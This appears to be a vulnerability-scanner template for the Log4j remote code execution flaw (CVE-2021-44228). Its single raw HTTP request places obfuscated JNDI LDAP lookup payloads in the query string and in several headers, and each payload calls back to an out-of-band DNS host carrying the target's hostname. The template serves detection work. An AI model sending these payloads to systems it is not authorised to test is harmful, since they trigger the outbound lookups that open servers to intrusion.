id: CVE-2021-44228

info:
  name: Log4j RCE
  author: hndanesh
  severity: critical
  description: Create a new DNS bin here and pass as DNS_CALLBACK variable, hostname would be added as a prefix 
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
    - https://github.com/christophetd/log4shell-vulnerable-app
  tags: cve,cve2021,rce,oast,log4j

requests:
  - raw:
      - |
        GET /?x=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-l%7D$%7B::-d%7D$%7B::-a%7D$%7B::-p%7D://x$%7BhostName%7D.{{DNS_CALLBACK}}/a%7D HTTP/1.1
        Host: {{Hostname}}
        User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{x${hostName}.{DNS_CALLBACK}}/a}
        Referer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x${hostName}.{{DNS_CALLBACK}}/a}
        X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x${hostName}.{{DNS_CALLBACK}}/a}
